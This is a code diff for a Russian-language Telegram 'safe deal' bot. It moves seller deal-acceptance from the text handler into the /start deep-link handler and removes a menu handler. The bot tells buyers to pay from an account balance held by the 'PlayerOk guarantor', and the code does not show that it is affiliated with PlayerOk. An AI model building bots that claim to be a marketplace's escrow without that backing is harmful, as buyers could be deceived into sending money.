@@ -19,6 +19,24 @@ const mainKb = Markup.inlineKeyboard([
 bot.start((ctx) => {
   const username = ctx.from.username;
   if (username) users[username.toLowerCase()] = ctx.chat.id;
+  
+  // Правильный разбор deep-link ссылки без использования split/replace на массивах
+  const payload = ctx.startPayload || '';
+  if (payload.startsWith('ok_')) {
+    const dealId = payload.substring(3);
+    const d = deals[dealId];
+    if (d && d.seller.toLowerCase() === (username || '').toLowerCase()) {
+      d.s_chat = ctx.chat.id;
+      d.status = 'accepted';
+      
+      bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВнесите оплату с баланса аккаунта для заморозки средств:`, 
+        Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]])
+      ).catch((e) => console.log(e));
+
+      return ctx.replyWithMarkdown(`🤝 *Вы приняли условия безопасной сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на счет Гаранта PlayerOk.`).catch((e) => console.log(e));
+    }
+  }
+
   if (ctx.session) ctx.session = {};
   return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.log(e));
 });
@@ -36,27 +54,11 @@ bot.action('create', (ctx) => {
 });
 
 bot.on('text', async (ctx) => {
-  const txt = ctx.message.text.trim();
   const username = ctx.from.username;
   if (username) users[username.toLowerCase()] = ctx.chat.id;
 
-  // Проверка глубокой ссылки активации сделки через /start ok_123456
-  if (txt.startsWith('/start ok_')) {
-    const dealId = txt.split(' ')[1].replace('ok_', '');
-    const d = deals[dealId];
-    if (d && d.seller.toLowerCase() === (username || '').toLowerCase()) {
-      d.s_chat = ctx.chat.id;
-      d.status = 'accepted';
-      
-      bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВнесите оплату с баланса аккаунта для заморозки средств:`, 
-        Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]])
-      ).catch((e) => console.log(e));
-
-      return ctx.replyWithMarkdown(`🤝 *Вы приняли условия безопасной сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на счет Гаранта PlayerOk.`).catch((e) => console.log(e));
-    }
-  }
-
   if (!ctx.session || !ctx.session.step) return;
+  const txt = ctx.message.text.trim();
 
   if (ctx.session.step === 'partner') {
     ctx.session.partner = txt.replace('@', '').toLowerCase();
@@ -140,4 +142,3 @@ bot.action(/^end_(.+)$/, (ctx) => {
   ).catch(() => {});
 });
 
-bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.log(e)));
